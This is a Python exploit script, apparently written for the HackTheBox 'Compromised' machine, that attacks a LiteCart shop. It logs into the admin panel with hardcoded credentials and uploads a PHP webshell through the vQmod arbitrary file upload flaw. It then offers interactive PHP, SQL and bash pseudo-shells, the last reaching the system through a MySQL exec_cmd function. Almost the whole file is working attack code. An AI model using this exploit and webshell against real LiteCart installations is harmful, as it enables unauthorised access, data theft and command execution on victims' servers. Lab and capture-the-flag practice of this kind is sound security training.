#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from hashlib import md5

host = "http://compromised.htb" # Host to attack
proxies = {'http':'http://127.0.0.1:8080'} # HTTP proxies for debugging / logging


def get_token(url:str) -> str:
    """
    Parses token from given url
    """
    html = requests.get(url).text
    soup = BeautifulSoup(html, features="xml")
    token = soup.find('input', {'name':'token'})['value']
    return token


def login(username:str="admin", password:str="theNextGenSt0r3!~") -> requests.Session:
    """
    Tries to login and if successful, return session
    """
    session = requests.Session()
    data = {
        'token':get_token(f"{host}/shop/admin/login.php"),
        'username':username,
        'password':password,
        'login':'true'
    }
    if session.post(f"{host}/shop/admin/login.php", data=data, allow_redirects=False, proxies=proxies).status_code != 302:
        raise Exception("Did not successfully login! Please retry.")
    
    # Return session, if login was successful
    return session


def exploit(session:requests.Session, code:str) -> str:
    """
    Exploits the LiteCart arbitrary file upload vulnerability to execute php-code.
    Returns result of execution of inputted php-code as text
    """
    hash = md5(code.encode()).hexdigest()
    file = {
        'vqmod': (f"{hash}.php", f"<?php {code} ?>", "application/xml"),
        'token':get_token(f"{host}/shop/admin/?app=vqmods&doc=vqmods"),
        'upload':(None,"Upload")
    }

    if session.post(f"{host}/shop/admin/?app=vqmods&doc=vqmods", files=file, allow_redirects=False, proxies=proxies).status_code != 302:
        raise Exception("Error on upload!")
    shell = requests.get(f"{host}/shop/vqmod/xml/{hash}.php", proxies=proxies)
    if shell.status_code != 200:
        raise Exception(f"Could not access webshell at: {host}/shop/vqmod/xml/{hash}.php\nDEBUG: {shell.status_code}")
    #print(f"File available at: {host}/shop/vqmod/xml/{random}.php")

    # Print result of code
    return shell.text.strip()


def php_shell() -> None:
    """
    Creates a pseudo php-shell to execute PHP-code
    """
    print("""Usage:
            cat {file}  ... read file
            ls {dir}    ... read directory
            {php}       ... execute php code
            exit|quit   ... exit php-shell""")
    
    while True:
        php = input("php> ")
        if "exit" in php or "quit" in php:
            return
        elif "cat" in php:
            file = php.split("cat")[1].strip()
            php = f"echo file_get_contents('{file}');"
        elif "ls" in php:
            file = php.split("ls")[1].strip()
            php = f"print_r(scandir('{file}'));"
        elif php.strip() == "":
            clear()
            print("""Usage:
            cat {file}  ... read file
            ls {dir}    ... read directory
            {php}       ... execute php code
            exit|quit   ... exit php-shell""")
        '''
        elif "write" in php:
            args = php.split("write")[1].strip()
            data, location = args.split(" ")
            print(f"data: {data}\nlocation: {location}")
            php = f"file_put_contents({location},{data});"
        '''
        print(exploit(session, php))


def sql_shell() -> None:
    """
    Creates a pseudo sql-shell to execute SQL-statments
    """
    print("""Usage:
            {sql}       ... execute sql statement
            exit|quit   ... exit sql-shell""")
    
    while True:
        sql = input("sql> ")
        if "exit" in sql or "quit" in sql:
            return
        elif sql.strip() == "":
            clear()
            print("""Usage:
            {sql}       ... execute sql statement
            exit|quit   ... exit sql-shell""")
        
        # Escape input
        sql = sql.replace('"', '\\"')

        # PHP code to connect and run sql-statemente
        code = f"""
        $conn = new mysqli("localhost", "root", "changethis", "ecom");
        if ($conn->connect_error) {{
            die("Connection failed: " . $conn->connect_error);
        }}
        $result = $conn->query("{sql}");

        if ($result->num_rows > 0) {{
            // output data of each row
            while($row = $result->fetch_assoc()) {{
                print_r($row);
            }}
        }}
        $conn->close();
        """
        print(exploit(session, code))


def bash_shell() -> None:
    """
    Creates a pseudo shell to execute bash-commands as mysql
    """
    print("""Usage:
            {cmd}       ... execute bash command
            exit|quit   ... exit shell""")
    
    while True:
        cmd = input("mysql:~$ ")
        if "exit" in cmd or "quit" in cmd:
            return
        elif cmd.strip() == "":
            clear()
            print("""Usage:
            {cmd}       ... execute bash command
            exit|quit   ... exit shell""")
        
        # Escape input
        cmd = cmd.replace('"', '\\"')
        cmd = cmd.replace("'", "\\'")
        sql = f"select exec_cmd('{cmd}');"

        # PHP code to connect and run sql-statemente
        code = f"""
        $conn = new mysqli("localhost", "root", "changethis", "ecom");
        if ($conn->connect_error) {{
            die("Connection failed: " . $conn->connect_error);
        }}
        $result = $conn->query("{sql}");

        if ($result->num_rows > 0) {{
            // output data of each row
            while($row = $result->fetch_assoc()) {{
                // Get output of command and strip new line
                echo str_replace("\n", "", end($row));
            }}
        }}
        $conn->close();
        """
        print(exploit(session, code))


def clear() -> None:
    """
    Clears terminal
    """
    print(chr(27) + "[H" + chr(27) + "[J")


def print_logo() -> None:
    """
    Prints script-logo
    """
    print("""
   _____                                                 _                 _             _____  _            _  _ 
  / ____|                                               (_)               | |           / ____|| |          | || |
 | |      ___   _ __ ___   _ __   _ __  ___   _ __ ___   _  ___   ___   __| |  ______  | (___  | |__    ___ | || |
 | |     / _ \ | '_ ` _ \ | '_ \ | '__|/ _ \ | '_ ` _ \ | |/ __| / _ \ / _` | |______|  \___ \ | '_ \  / _ \| || |
 | |____| (_) || | | | | || |_) || |  | (_) || | | | | || |\__ \|  __/| (_| |           ____) || | | ||  __/| || |
  \_____|\___/ |_| |_| |_|| .__/ |_|   \___/ |_| |_| |_||_||___/ \___| \__,_|          |_____/ |_| |_| \___||_||_|
                          | |                                                                                     
                          |_|                                                                                     
  ____            _____  _             ___           __          ____                                             
 |  _ \          / ____|| |           / _ \         / /         / __ \                                            
 | |_) | _   _  | |     | |__   _ __ | | | |__  __ / /_    ___ | |  | | ___                                       
 |  _ < | | | | | |     | '_ \ | '__|| | | |\ \/ /| '_ \  / _ \| |  | |/ __|                                      
 | |_) || |_| | | |____ | | | || |   | |_| | >  < | (_) ||  __/| |__| |\__ \                                      
 |____/  \__, |  \_____||_| |_||_|    \___/ /_/\_\ \___/  \___| \____/ |___/                                      
          __/ |                                                                                                   
         |___/                                                                                                    

 Twitter:    https://twitter.com/Chr0x6eOs
 Github:     https://github.com/Chr0x6eOs
 HackTheBox: https://www.hackthebox.eu/home/users/profile/134448
                          
 ___________________________________________________________________________________________________________________

    Shell-types:
    * php   -   Execute PHP-commands
    * sql   -   Execute SQL-commands
    * bash  -   Execute bash-commands

    Enter 'exit' or 'quit' to close script!
    """)


if __name__ == "__main__":
    # Get valid session
    try:
        session = login()
    except Exception as ex:
        print(f"[-] Error: {ex}")
        quit()
    
    # Run interactive pseudo-shell
    while True:
        try:
            clear()
            print_logo()
            type = input("type> ")
            if "php" in type:
                php_shell()
            elif "sql" in type:
                sql_shell()
            elif "bash" in type:
                bash_shell()
            elif "exit" in type or "quit" in type:
                quit()
        except KeyboardInterrupt:
            quit()
        except Exception as ex:
            print(f"[-] Error: {ex}")
            quit()